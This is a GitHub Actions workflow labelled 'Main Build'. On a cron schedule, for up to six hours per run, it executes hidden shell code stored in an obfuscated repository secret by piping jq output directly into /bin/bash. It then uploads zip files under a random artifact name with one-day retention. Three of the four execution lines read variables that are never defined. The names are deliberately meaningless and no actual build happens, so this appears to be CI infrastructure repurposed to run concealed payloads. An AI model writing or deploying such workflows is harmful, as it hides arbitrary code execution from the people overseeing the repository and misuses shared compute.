name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '35 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          gqp10: ${{ secrets.gqp10 }}
        run: |
          printf '%s' "$gqp10" | jq -r .wh84 | /bin/bash
          printf '%s' "$prbim712" | jq -r .et42 | /bin/bash
          printf '%s' "$mxlsj31549" | jq -r .rft9 | /bin/bash
          echo $m096 | jq -r .ukrom9 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: ZduDyyNx
          path: "*.zip"
          retention-days: 1
